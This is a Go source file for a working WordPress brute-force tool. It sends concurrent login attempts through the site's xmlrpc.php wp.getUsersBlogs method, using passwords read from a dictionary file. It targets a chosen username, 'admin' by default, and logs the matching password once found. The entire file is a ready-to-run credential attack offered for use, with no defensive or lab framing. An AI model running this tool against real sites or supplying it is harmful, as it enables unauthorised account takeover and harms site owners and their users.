package main

import (
	"bufio"
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

const MAX_ROUTINES = 10

type Credentials struct {
	username string
	password string
}

func main() {
	args := parse_command_args()
	url := fmt.Sprintf("%s/xmlrpc.php", args["url"])

	passwords := make(chan string)
	workers := make(chan int, MAX_ROUTINES)
	done := make(chan bool)

	dictionary := args["dict"]
	go get_passwords(&dictionary, &passwords, &done)

	log.Printf("Initiating Requests...\n")

	for password := range passwords {
		credentials := Credentials{
			username: args["username"],
			password: password,
		}

		// worker pool with maximum limit of goroutines
		workers <- 1
		go func() {
			attempt_login(&url, &credentials, &done)
			<-workers
		}()
	}

	<-done
}

// parse command-line flags
func parse_command_args() map[string]string {
	url_ptr := flag.String("url", "https://www.wordpress-site.com", "URL to WordPress website to target (without trailing /)")
	pwd_list := flag.String("dict", "dict.txt", "A text dictionary containing passwords to try")
	username := flag.String("user", "admin", "Username to brute-force")

	flag.Parse()

	return map[string]string{
		"url":      *url_ptr,
		"dict":     *pwd_list,
		"username": *username,
	}
}

// try to login on xmlrpc
func attempt_login(url *string, credentials *Credentials, done *chan bool) {
	request_body := generate_body(credentials)

	body, err := send_request(url, &request_body)
	if err != nil {
		log.Fatalln(err)
	}

	is_success := fail_or_pass(&body)
	log.Printf("Password :: %s :: Match :: %v \n", (*credentials).password, is_success)

	if is_success {
		log.Printf("\n\nFound Corrrect Password :: %s \n", (*credentials).password)
		*done <- true
	}
}

// create post request body
func generate_body(credentials *Credentials) string {
	return fmt.Sprintf(`
	<?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>%s</string></value>
    </param>
    <param>
      <value><string>%s</string></value>
    </param>
  </params>
  </methodCall>
  `, (*credentials).username, (*credentials).password)
}

// send off a request to the remote server
func send_request(url *string, body *string) (string, error) {
	body_bytes := []byte(*body)
	res, err := http.Post(*url, "application/xml", bytes.NewBuffer(body_bytes))

	if err != nil {
		return "", err
	}

	defer res.Body.Close()

	status_code := res.StatusCode
	if status_code != 200 {
		message := fmt.Sprintf("Recieved unexpected HTTP Status :: %d \n", status_code)
		return "", errors.New(message)
	}

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", errors.New("Failed to read request Body")
	}

	return string(res_body), nil
}

// check if the request passes or not
func fail_or_pass(body *string) bool {
	return !strings.Contains(*body, "faultCode")
}

// get from file one password at a time
func get_passwords(pwd_list *string, channel *chan string, done *chan bool) {
	file, err := os.Open(*pwd_list)
	if err != nil {
		log.Fatalln("Failed to open file")
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	// send at a time, one password into the channel
	for scanner.Scan() {
		*channel <- scanner.Text()
	}

	*done <- true
}
